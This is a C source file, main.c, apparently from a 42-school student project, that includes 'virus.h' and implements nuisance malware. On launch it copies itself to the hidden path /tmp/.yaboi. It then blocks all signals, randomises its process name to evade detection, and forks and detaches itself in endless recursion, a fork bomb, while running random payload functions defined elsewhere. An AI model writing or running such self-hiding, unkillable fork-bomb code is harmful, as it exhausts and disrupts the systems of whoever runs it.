/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: acarlson <marvin@42.fr>                    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/04/21 14:44:38 by acarlson          #+#    #+#             */
/*   Updated: 2019/04/21 14:46:13 by acarlson         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "virus.h"

static void (*g_bois[])(void) = {
	colors,
	colors,
	colors,
	colors,
	colors,
	colors,
	luigme,
	luigme,
	luigme,
	luigme,
	luigme,
	luigme,
	luigme,
	luigme,
	luigme,
	luigme,
	protection,
};

int		forkyboi(void)
{
	int		pid;
	int		sid;

	write(1, "A", 1);
	pid = fork();
	if (pid < 0)
		exit(1);
	if (pid > 0)
		g_bois[rand() % (sizeof(g_bois) / sizeof(*g_bois))]();
	sid = setsid();
	if (sid < 0)
		exit(1);
	random_pname(NULL);
	sleep(1);
	thing();
	return (0);
}

char	*concat(const char *s1, const char *s2, const char *s3)
{
	char *result;

	result = malloc(strlen(s1) + strlen(s2) + strlen(s3) + 1);
	strcpy(result, s1);
	strcat(result, s2);
	strcat(result, s3);
	return (result);
}

void	thing(void)
{
	sigset_t	mask;

	srand(time(NULL));
	random_pname(NULL);
	sigfillset(&mask);
	sigprocmask(SIG_SETMASK, &mask, NULL);
	forkyboi();
}

int		main(int argc, char **argv)
{
	char	*s;

	(void)argc;
	(void)argv;
	if (strcmp(argv[0], "/tmp/.yaboi"))
	{
		s = concat("cp ", argv[0], " /tmp/.yaboi");
		system(s);
		free(s);
	}
	thing();
}
